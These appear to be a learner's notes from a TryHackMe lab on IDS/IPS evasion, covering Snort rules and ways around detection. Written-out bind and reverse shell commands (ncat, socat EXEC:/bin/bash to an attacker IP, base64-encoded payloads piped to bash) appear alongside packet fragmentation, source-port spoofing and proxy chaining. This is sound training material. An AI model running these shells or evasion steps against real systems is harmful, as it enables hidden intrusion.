# Introduction

---

An Intrusion Detection System (IDS) is a system that detects network or system intrusions. One analogy that comes to mind is a guard watching live feeds from different security cameras. He can spot a theft, but he cannot stop it by himself. However, if this guard can contact another guard and ask them to stop the robber, detection turns into prevention. An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that can detect and prevent intrusions.

Understanding the difference betweenÂ _detection_Â andÂ _prevention_Â is essential. Snort is a network intrusion detection and intrusion prevention system. Consequently, Snort can be set up as anÂ IDSÂ or anÂ IPS. For Snort to function as anÂ IPS, it needs some mechanism to block (`drop`) offending connections. This capability requires Snort to be set up asÂ `inline`Â and to bridge two or more network cards.

As a signature-based networkÂ IDS, Snort is shown in the figure below.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/112f5abb83ffd40a8ce514980242ce60.png)  

The following figure shows how Snort can be configured as anÂ IPSÂ if set up inline.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0925b08163ea115da03213b6fd846296.png)  

IDSÂ setups can be divided based on their location in the network into:

1. Host-basedÂ IDSÂ (HIDS)
2. Network-basedÂ IDSÂ (NIDS)

The host-basedÂ IDSÂ (HIDS) is installed on anÂ OSÂ along with the other running applications. This setup will give theÂ HIDSÂ the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host.

The network-basedÂ IDSÂ (NIDS) is a dedicated appliance or server to monitor the network traffic. TheÂ NIDSÂ should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting theÂ NIDSÂ to a monitor port on the switch. TheÂ NIDSÂ will process the network traffic to detect malicious traffic.

In the figure below, we use two red circles to show the difference in the coverage of aÂ HIDSÂ versus aÂ NIDS.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/61e14978e7f97e0de5d467babc3cfbff.png)


![Pasted image 20250523134249.png](../../../IMAGES/Pasted%20image%2020250523134249.png)


# IDS Engine Types

---

We can classify network traffic into:

1. **Benign traffic**: This is the usual traffic that we expect to have and donâ€™t want theÂ IDSÂ to alert us about.
2. **Malicious traffic**: This is abnormal traffic that we donâ€™t expect to see under normal conditions and consequently want theÂ IDSÂ to detect it.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ce5ea133da9aaa810b982e4745d4e635.png)  

In the same way that we can classify network traffic, we can also classify host activity. TheÂ IDSÂ detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing â€œnormalâ€ makes it easy to detect any deviation from normal.

Consequently, the detection engine of anÂ IDSÂ can be:

1. **Signature-based**: A signature-basedÂ IDSÂ requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching theÂ IDSÂ about malicious traffic can be achieved using explicit rules to match against.
2. **Anomaly-based**: This requires theÂ IDSÂ to have knowledge of what regular traffic looks like. In other words, we need to â€œteachâ€ theÂ IDSÂ what normal is so that it can recognize what isÂ **not**Â normal. Teaching theÂ IDSÂ about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules.

Put in another way, signature-basedÂ IDSÂ recognizes malicious traffic, so everything that is not malicious is considered benign (normal). This approach is commonly found in anti-virus software, which has a database of known virus signatures. Anything that matches a signature is detected as a virus.

An anomaly-basedÂ IDSÂ recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what â€œnormalâ€ is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browserâ€™s performance deviated from normal.


![Pasted image 20250523134701.png](../../../IMAGES/Pasted%20image%2020250523134701.png)


  
# IDS/IPS Rule Triggering

---

EachÂ IDS/IPSÂ has a certain syntax to write its rules. For example, Snort uses the following format for its rules:Â `Rule Header (Rule Options)`, whereÂ **Rule Header**Â constitutes:

1. Action: Examples of action includeÂ `alert`,Â `log`,Â `pass`,Â `drop`, andÂ `reject`.
2. Protocol:Â `TCP`,Â `UDP`,Â `ICMP`, orÂ `IP`.
3. Source IP/Source Port:Â `!10.10.0.0/16 any`Â refers to everything not in the class B subnetÂ `10.10.0.0/16`.
4. Direction of Flow:Â `->`Â indicates left (source) to right (destination), whileÂ `<>`Â indicates bi-directional traffic.
5. Destination IP/Destination Port:Â `10.10.0.0/16 any`Â to refer to class B subnetÂ `10.10.0.0/16`.

Below is an example rule toÂ `drop`Â all ICMP traffic passing through SnortÂ IPS:

`drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)`

The rule above instructs the SnortÂ IPSÂ to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is â€œICMP Ping Scan.â€

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b77e611870d301ecd622311ec1100d83.png)  

Letâ€™s consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handlesÂ HTTPÂ POST method requests, allowing the attacker to run system commands.

Letâ€™s consider the following â€œnaiveâ€ approach. We want to create a Snort rule that detects the termÂ `ncat`Â in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability.

`alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)`

The rule above inspects the content of the packets exchanged with port 80 for the stringÂ `ncat`. Alternatively, you can choose to write the content that Snort will scan for in hexadecimal format.Â `ncat`Â in ASCII is written asÂ `6e 63 61 74`Â in hexadecimal and it is encapsulated as a string by 2 pipe charactersÂ `|`.

`alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"|6e 63 61 74|"; sid: 1000031; rev:1;)`

We can further refine it if we expect to see it inÂ HTTPÂ POST requests.Â Note thatÂ `flow:established`Â tells the Snort engine to look at streams started by aÂ TCPÂ 3-way handshake (established connections).

`alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)`

If ASCII logging is chosen, the logs would be similar to the two alerts shown next.

```shell-session
[**] [1:1000031:1] Netcat Exploitation [**]
[Priority: 0] 
01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
***AP*** Seq: 0x26B5C2F  Ack: 0x0  Win: 0x0  TcpLen: 32

[**] [1:1000031:1] Netcat Exploitation [**]
[Priority: 0] 
01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
***AP*** Seq: 0x26B5C2F  Ack: 0xF1090882  Win: 0x3F  TcpLen: 32
TCP Options (3) => NOP NOP TS: 2244530364 287085341
```

There are a few points to make about signature-basedÂ IDSÂ and its rules. If the attacker made even the slightest changes to avoid usingÂ `ncat`Â verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-basedÂ IDSÂ orÂ IPSÂ is limited to how well-written and updated its signatures (rules) are. We discuss some evasion techniques in the next task.

![Pasted image 20250523135134.png](../../../IMAGES/Pasted%20image%2020250523135134.png)

![Pasted image 20250523135146.png](../../../IMAGES/Pasted%20image%2020250523135146.png)



# Evasion via Protocol Manipulation

---

![Pasted image 20250523135228.png](../../../IMAGES/Pasted%20image%2020250523135228.png)


Evading a signature-basedÂ IDS/IPSÂ requires that you manipulate your traffic so that it does not match anyÂ IDS/IPSÂ signatures. Here are four general approaches you might consider to evadeÂ IDS/IPSÂ systems.

1. Evasion via Protocol Manipulation
2. Evasion via Payload Manipulation
3. Evasion via Route Manipulation
4. Evasion via Tactical Denial of Service (DoS)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3c82c010e4fe88cefb53991fd58c762a.png)  

This room focuses on evasion usingÂ `nmap`Â andÂ `ncat`/`socat`. The evasion techniques related to Nmap are discussed in great detail in theÂ [Firewalls](https://tryhackme.com/room/redteamfirewalls)Â room. This room will emphasizeÂ `ncat`Â andÂ `socat`Â where appropriate.

We will expand on each of these approaches in its own task. Letâ€™s start with the first one. Evasion via protocol manipulation includes:

- Relying on a different protocol
- Manipulating (Source)Â TCP/UDPÂ port
- Using session splicing (IP packet fragmentation)
- Sending invalid packets

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dba39db8e9ffe2adeae19a57e8fb01dd.png)  

### Rely on a Different Protocol

TheÂ IDS/IPSÂ system might be configured to block certain protocols and allow others. For instance, you might consider usingÂ UDPÂ instead ofÂ TCPÂ or rely onÂ HTTPÂ instead ofÂ DNSÂ to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a localÂ proxyÂ is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you donâ€™t create too much noise.

We have anÂ IPSÂ set to blockÂ DNSÂ queries andÂ HTTPÂ requests in the figure below. In particular, it enforces the policy where local machines cannot query externalÂ DNSÂ servers but should instead query the localÂ DNSÂ server; moreover, it enforces secureÂ HTTPÂ communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade theÂ IPS.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b42ec04cbb84ddd7c08f168be25c4215.png)  

Consider the case where you are usingÂ [Ncat](https://nmap.org/ncat). Ncat, by default, uses aÂ TCPÂ connection; however, you can get it to useÂ UDPÂ using the optionÂ `-u`.

- To listen usingÂ TCP, just issueÂ `ncat -lvnp PORT_NUM`Â where port number is the port you want to listen to.
- to connect to an Ncat instance listening on aÂ TCPÂ port, you can issueÂ `ncat TARGET_IP PORT_NUM`

Note that:

- `-l`Â tellsÂ `ncat`Â to listen for incoming connections
- `-v`Â gets more verbose output asÂ `ncat`Â binds to a source port and receives a connection
- `-n`Â avoids resolving hostnames
- `-p`Â specifies the port number thatÂ `ncat`Â will listen on

As already mentioned, usingÂ `-u`Â will move all communications overÂ UDP.

- To listen usingÂ UDP, just issueÂ `ncat -ulvnp PORT_NUM`Â where port number is the port you want to listen to. Note that unless you addÂ `-u`,Â `ncat`Â will useÂ TCPÂ by default.
- To connect to an Ncat instance listening on aÂ UDPÂ port, you can issueÂ `nc -u TARGET_IP PORT_NUM`

Consider the following two examples:

- RunningÂ `ncat -lvnp 25`Â on the attacker system and connecting to it will give the impression that it is a usualÂ TCPÂ connection with anÂ SMTPÂ server, unless theÂ IDS/IPSÂ provides deep packet inspection (DPI).
- ExecutingÂ `ncat -ulvnp 162`Â on the attacker machine and connecting to it will give the illusion that it is a regularÂ UDPÂ communication with an SNMP server unless theÂ IDS/IPSÂ supportsÂ DPI.

### Manipulate (Source)Â TCP/UDPÂ Port

Generally speaking, theÂ TCPÂ andÂ UDPÂ source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection, the port numbers are the primary indicator of the service used. In other words, network traffic involvingÂ TCPÂ port 22 would be interpreted asÂ SSHÂ traffic unless the security solution can analyze the data carried by theÂ TCPÂ segments.

Depending on the target security solution, you can make your port scanning traffic resemble web browsing orÂ DNSÂ queries. If you are usingÂ Nmap, you can add the optionÂ `-g PORT_NUMBER`Â (orÂ `--source-port PORT_NUMBER`) to makeÂ NmapÂ send all its traffic from a specific source port number.

While scanning a target, useÂ `nmap -sS -Pn -g 80 -F MACHINE_IP`Â to make the port scanning traffic appear to be exchanged with anÂ HTTPÂ server at first glance.

If you are interested in scanningÂ UDPÂ ports, you can useÂ `nmap -sU -Pn -g 53 -F MACHINE_IP`Â to make the traffic appear to be exchanged with aÂ DNSÂ server.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0826134be47960f6466b84c0d5407654.png)  

Consider the case where you are usingÂ [Ncat](https://nmap.org/ncat). You can try to camouflage the traffic as if it is someÂ DNSÂ traffic.

- On the attacker machine, if you want to use Ncat to listen onÂ UDPÂ port 53, as aÂ DNSÂ server would, you can useÂ `ncat -ulvnp 53`.
- On the target, you can make it connect to the listening server usingÂ `ncat -u ATTACKER_IP 53`.

Alternatively, you can make it appear more like web traffic where clients communicate with anÂ HTTPÂ server.

- On the attacker machine, to get Ncat to listen onÂ TCPÂ port 80, like a benign web server, you can useÂ `ncat -lvnp 80`.
- On the target, connect to the listening server usingÂ `nc ATTACKER_IP 80`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b85668a256470594ea8a6310f68b5f86.png)  

### Use Session Splicing (IP Packet Fragmentation)

Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching theÂ IDSÂ signatures. If theÂ IDSÂ is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless theÂ IDSÂ reassembles the packets, the rule wonâ€™t be triggered.

NmapÂ offers a few options to fragment packets. You can add:

- `-f`Â to set the data in the IP packet to 8 bytes.
- `-ff`Â to limit the data in the IP packet to 16 bytes at most.
- `--mtu SIZE`Â to provide a custom size for data carried within the IP packet. The size should be a multiple of 8.

Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such asÂ [Fragroute](https://www.monkey.org/~dugsong/fragroute/).Â `fragroute`Â can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file withÂ `ip_frag SIZE`Â to fragment the IP data according to the provided size. The size should be a multiple of 8.

For example, you can create a configuration fileÂ `fragroute.conf`Â with one line,Â `ip_frag 16`, to fragment packets where IP data fragments donâ€™t exceed 16 bytes. Then you would run the commandÂ `fragroute -f fragroute.conf HOST`. The host is the destination to which we would send the fragmented packets it.

### Sending Invalid Packets

Generally speaking, the response of systems to valid packets tends to be predictable. However, it can be unclear how systems would respond to invalid packets. For instance, anÂ IDS/IPSÂ might process an invalid packet, while the target system might ignore it. The exact behavior would require some experimentation or inside knowledge.

NmapÂ makes it possible to create invalid packets in a variety of ways. In particular, two common options would be to scan the target using packets that have:

- InvalidÂ TCP/UDPÂ checksum
- InvalidÂ TCPÂ flags

NmapÂ lets you send packets with a wrongÂ TCP/UDPÂ checksum using the optionÂ `--badsum`. An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program.

NmapÂ also lets you send packets with customÂ TCPÂ flags, including invalid ones. The optionÂ `--scanflags`Â lets you choose which flags you want to set.

- `URG`Â for Urgent
- `ACK`Â for Acknowledge
- `PSH`Â for Push
- `RST`Â for Reset
- `SYN`Â for Synchronize
- `FIN`Â for Finish

For instance, if you want to set the flags Synchronize, Reset, and Finish simultaneously, you can useÂ `--scanflags SYNRSTFIN`, although this combination might not be beneficial for your purposes.

If you want to craft your packets with custom fields, whether valid or invalid, you might want to consider a tool such asÂ `hping3`. We will list a few example options to give you an idea of packet crafting usingÂ `hping3`.

- `-t`Â orÂ `--ttl`Â to set the Time to Live in the IP header
- `-b`Â orÂ `--badsum`Â to send packets with a badÂ UDP/TCPÂ checksum
- `-S`,Â `-A`,Â `-P`,Â `-U`,Â `-F`,Â `-R`Â to set theÂ TCPÂ SYN, ACK, PUSH, URG, FIN, and RST flags, respectively

There is a myriad of other options. Depending on your needs, you might want to check theÂ `hping3`Â manual page for the complete list.



![Pasted image 20250523140324.png](../../../IMAGES/Pasted%20image%2020250523140324.png)


# Evasion via Payload Manipulation

---

Evasion via payload manipulation includes:

- Obfuscating and encoding the payload
- Encrypting the communication channel
- Modifying the shellcode

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/245004e9e2336cc06906009b969d330b.png)  

### Obfuscate and Encode the Payload

Because theÂ IDSÂ rules are very specific, you can make minor changes to avoid detection. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication.

Consider the commandÂ `ncat -lvnp 1234 -e /bin/bash`, whereÂ `ncat`Â will listen onÂ TCPÂ port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that you can apply to your command to avoid triggeringÂ IDS/IPSÂ signatures.

#### Encode to Base64 format

You can use one of the many online tools that encode your input to Base64. Alternatively, you can useÂ `base64`Â commonly found onÂ LinuxÂ systems.

Pentester Terminal

```shell-session
pentester@TryHackMe$ cat input.txt
ncat -lvnp 1234 -e /bin/bash
$ base64 input.txt
bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
```

`ncat -lvnp 1234 -e /bin/bash`Â is encoded toÂ `bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==`.

#### URL Encoding

URL encoding converts certain characters to the form %HH, where HH is the hexadecimal ASCII representation. English letters, period, dash, and underscore are not affected. You can refer toÂ [section 2.4 inÂ RFCÂ 3986](https://datatracker.ietf.org/doc/html/rfc3986#section-2.4)Â for more information.

One utility that you can easily install on yourÂ LinuxÂ system isÂ `urlencode`; alternatively, you can either use an online service or search for similar utilities on MS Windows and macOS. To follow along on the AttackBox, you can installÂ `urlencode`Â by running the commandÂ `apt install gridsite-clients`.

Pentester Terminal

```shell-session
pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bash
ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
```

`ncat -lvnp 1234 -e /bin/bash`Â becomesÂ `ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash`Â after URL encoding. Depending what theÂ IDS/IPSÂ signature is matching, URL encoding might help evade detection.

#### Use Escaped Unicode

Some applications will still process your input and execute it properly if you use escaped Unicode. There are multiple ways to use escaped Unicode depending on the system processing the input string.Â For example, you can useÂ [CyberChef](https://icyberchef.com/)Â to select and configure the Escape Unicode Characters recipe as shown in the image below.

1. Search forÂ _Escape Unicode Characters_
2. Drag it to theÂ _Recipe_Â column
3. Ensure you a check-mark nearÂ _Encode all chars_Â with a prefix ofÂ `\u`
4. Ensure you have a check-mark nearÂ _Uppercase hex_Â with a padding of 4

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f330a782dc93a8b227fc93231aa1649a.png)  

If you use the formatÂ `\uXXXX`, thenÂ `ncat -lvnp 1234 -e /bin/bash`Â becomesÂ `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`. It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it.

### Encrypt the Communication Channel

Because anÂ IDS/IPSÂ wonâ€™t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.

One direct approach is to create the necessary encryption key on the attackerâ€™s system and setÂ `socat`Â to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:

1. Create the key
2. Listen on the attackerâ€™s machine
3. Connect to the attackerâ€™s machine

**Firstly**, On the AttackBox or anyÂ LinuxÂ system, we can create the key usingÂ `openssl`.

`openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt`

The arguments in the above command are:

- `req`Â indicates that this is a certificate signing request. Obviously, we wonâ€™t submit our certificate for signing.
- `-x509`Â specifies that we want an X.509 certificate
- `-newkey rsa:4096`Â creates a new certificate request and a new private key usingÂ RSA, with the key size being 4096 bits. (You can use other options forÂ RSAÂ key size, such asÂ `-newkey rsa:2048`.)
- `-days 365`Â shows that the validity of our certificate will be one year
- `-subj`Â sets data, such as organization and country, via the command-line.
- `-nodes`Â simplifies our command and does not encrypt the private key
- `-keyout PRIVATE_KEY`Â specifies the filename where we want to save our private key
- `-out CERTIFICATE`Â specifies the filename to which we want to write the certificate request

The above command returns:

- Private key:Â `thm-reverse.key`
- Certificate:Â `thm-reverse.crt`

The Privacy Enhanced Mail (PEM)Â `.pem`Â file requires the concatenation of the private keyÂ `.key`Â and the certificateÂ `.crt`Â files. We can useÂ `cat`Â to create our PEM file from the two files that we have just created:

`cat thm-reverse.key thm-reverse.crt > thm-reverse.pem`.

**Secondly**, with the PEM file ready, we can start listening while using the key for encrypting the communication with the client.

`socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT`

If you are not familiar withÂ `socat`, the options that we used are:

- `-d -d`Â provides some debugging data (fatal, error, warning, and notice messages)
- `OPENSSL-LISTEN:PORT_NUM`Â indicates that the connection will be encrypted using OPENSSL
- `cert=PEM_FILE`Â provides the PEM file (certificate and private key) to establish the encrypted connection
- `verify=0`Â disables checking peerâ€™s certificate
- `fork`Â creates a sub-process to handle each new connection.

**Thirdly**, on the victim system,Â `socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash`. Note that theÂ `EXEC`Â invokes the specified program.

Letâ€™s demonstrate this. On the attacker system, we carried out the following:

Pentester Terminal

```shell-session
pentester@TryHackMe$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
Generating a RSA private key
........................++++
......++++
writing new private key to 'thm-reverse.key'
-----
pentester@TryHackMe$ ls
thm-reverse.crt  thm-reverse.key
pentester@TryHackMe$ cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
2022/02/24 13:39:07 socat[1208] W ioctl(6, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
2022/02/24 13:39:07 socat[1208] N listening on AF=2 0.0.0.0:4443
```

As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:

Target Terminal

```shell-session
pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
```

Back to the attacker system, letâ€™s runÂ `cat /etc/passwd`:

Pentester Terminal

```shell-session
pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
[...]
2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
[...]
```

However, if theÂ IDS/IPSÂ inspects the traffic, all the packet data will be encrypted. In other words, theÂ IPSÂ will be completely oblivious to exchange traffic and commands such asÂ `cat /etc/passwd`. The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet containsÂ `cat /etc/passwd`; however, it is encrypted.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3352df7b863f48cfaf0aee8f308e95a9.png)  

As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalentÂ `socat`Â connection that does not use encryption.

1. On the attackerâ€™s system, we runÂ `socat -d -d TCP-LISTEN:4443,fork STDOUT`.
2. On the victimâ€™s machine, we runÂ `socat TCP:10.20.30.129:4443 EXEC:/bin/bash`.
3. Back on the attackerâ€™s system, we typeÂ `cat /etc/passwd`Â and hit Enter/Return.

Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/08f8e9b8cdae4878dab23cbb57dfbbe2.png)  

Furthermore, it is a trivial task to follow theÂ TCPÂ stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the â€œFollowÂ TCPÂ Streamâ€ option from Wireshark.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/40f0e2f428db90b8b57d708d77eae99c.png)  

### Modify the data

Consider the simple case where you want to use Ncat to create a bind shell. The following commandÂ `ncat -lvnp 1234 -e /bin/bash`Â tellsÂ `ncat`Â to listen onÂ TCPÂ port 1234 and bind Bash shell to it. If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific.

- Scanning forÂ `ncat -lvnp`Â can be easily evaded by changing the order of the flags.
- On the other hand, inspecting the payload forÂ `ncat -`Â can be evaded by adding an extra white space, such asÂ `ncatÂ  -`Â which would still run correctly on the target system.
- If theÂ IDSÂ is looking forÂ `ncat`, then simple changes to the original command wonâ€™t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such asÂ `nc`Â orÂ `socat`. Alternatively, you can consider a different encoding if the target system can process it properly.


![Pasted image 20250523140826.png](../../../IMAGES/Pasted%20image%2020250523140826.png)


We can use the following payload at the last question:

```bash
echo 'bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==' | base64 -d | bash
```

We can then connect using:

```
nc IP 1234
```

We will get a shell and can execute `whoami`:

![Pasted image 20250523140924.png](../../../IMAGES/Pasted%20image%2020250523140924.png)



# Evasion via Route Manipulation

---

Evasion via route manipulation includes:

- Relying on source routing
- UsingÂ proxyÂ servers

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d0e4bdf9c029c7efa74b9962b3a42010.png)  

### Relying on Source Routing

In many cases, you can use source routing to force the packets to use a certain route to reach their destination.Â NmapÂ provides this feature using the optionÂ `--ip-options`.Â NmapÂ offers loose and strict routing:

- Loose routing can be specified usingÂ `L`. For instance,Â `--ip-options "L 10.10.10.50 10.10.50.250"`Â requests that your scan packets are routed through the two provided IP addresses.
- Strict routing can be specified usingÂ `S`. Strict routing requires you to set every hop between your system and the target host. For instance,Â `--ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"`Â specifies that the packets go via these three hops before reaching the target host.

### UsingÂ ProxyÂ Servers

The use ofÂ proxyÂ servers can help hide your source.Â NmapÂ offers the optionÂ `--proxies`Â that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the formatÂ `proto://host:port`. Valid protocols areÂ HTTPÂ and SOCKS4; moreover, authentication is not currently supported.

Consider the following example. Instead of runningÂ `nmap -sS 10.10.67.108`, you would edit yourÂ NmapÂ command to something likeÂ `nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 10.10.67.108`. This way, you would make your scan go throughÂ HTTPÂ proxyÂ host1, then SOCKS4Â proxyÂ host2, before reaching your target. It is important to note that finding a reliableÂ proxyÂ requires some trial and error before you can rely on it to hide yourÂ NmapÂ scan source.

If you use your web browser to connect to the target, it would be a simple task to pass your traffic via aÂ proxyÂ server. Other network tools usually provide their ownÂ proxyÂ settings that you can use to hide your traffic source.

![Pasted image 20250523141025.png](../../../IMAGES/Pasted%20image%2020250523141025.png)

# Evasion via Tactical DoS

---

Evasion via tacticalÂ DoSÂ includes:

- Launching denial of service against theÂ IDS/IPS
- Launching denial of Service against the logging server

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/53b31ed73b300020fbf7b2b699769b95.png)  

AnÂ IDS/IPSÂ requires a high processing power as the number of rules grows and the network traffic volume increases. Moreover, especially in the case ofÂ IDS, the primary response is logging traffic information matching the signature. Consequently, you might find it beneficial if you can:

- Create a huge amount of benign traffic that would simply overload the processing capacity of theÂ IDS/IPS.
- Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.

It is also worth noting that the target of your attack can be theÂ IDSÂ operator. By causing a vast number of false positives, you can cause operator fatigue against your â€œadversary.â€


# C2 and IDS/IPS Evasion

---

Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evadeÂ IDS/IPSÂ systems. If you are using such a framework, it is worth creating a custom profile instead of relying on a default one. Examples variables you can control include the following:

- **User-Agent**: The tool or framework you are using can expose you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your settings.
- **Sleep Time**: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system.
- **Jitter**: This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of Â±30% to further evade detection.
- **SSL Certificate**: Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a very worthy investment of time.
- **DNSÂ Beacon**: Consider the case where you are usingÂ DNSÂ protocol to exfiltrate data. You can fine-tuneÂ DNSÂ beacons by setting theÂ DNSÂ servers and the hostname in theÂ DNSÂ query. The hostname will be holding the exfiltrated data.

![Pasted image 20250523141107.png](../../../IMAGES/Pasted%20image%2020250523141107.png)

# Next-Gen Security

---

Next-Generation NetworkÂ IPSÂ (NGNIPS) has the following five characteristics according toÂ [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):

1. Standard first-generationÂ IPSÂ capabilities: A next-generation networkÂ IPSÂ should achieve what a traditional networkÂ IPSÂ can do.
2. Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.
3. Context-awareness: Use information from sources outside of theÂ IPSÂ to aid in blocking decisions.
4. Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.
5. Agile engine: Support upgrade paths to benefit from new information feeds.

